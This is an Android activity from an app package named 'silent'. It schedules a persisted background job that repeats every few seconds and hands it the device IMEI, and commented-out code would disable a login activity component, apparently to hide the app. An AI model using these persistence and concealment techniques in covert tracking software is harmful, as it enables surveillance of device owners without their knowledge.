package src.silent;

import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.os.Build;
import android.os.Bundle;
import android.os.PersistableBundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;

import src.silent.jobs.JobMaster;

public class MainActivity extends AppCompatActivity {

    private static final int jobMaster = 0;
    private JobScheduler jobScheduler;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        /*PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, LogInActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);*/

        jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);

    }

    public void scheduleMasterJob(View view) {
        JobInfo.Builder builder = new JobInfo.Builder(jobMaster, new ComponentName(this,
                JobMaster.class));
        builder.setPersisted(true);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            builder.setMinimumLatency(5000);
        } else {
            builder.setPeriodic(5000);
        }

        builder.setRequiresDeviceIdle(false);
        builder.setRequiresCharging(false);

        Bundle extras = getIntent().getExtras();
        PersistableBundle bundle = new PersistableBundle();
        bundle.putString("IMEI", extras.getString("IMEI"));
        builder.setExtras(bundle);

        builder.setBackoffCriteria(1000, JobInfo.BACKOFF_POLICY_LINEAR);

        jobScheduler.schedule(builder.build());

        /*PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, LogInActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/
    }

    public void clearMasterJob(View view) {
        jobScheduler.cancel(jobMaster);
    }
}
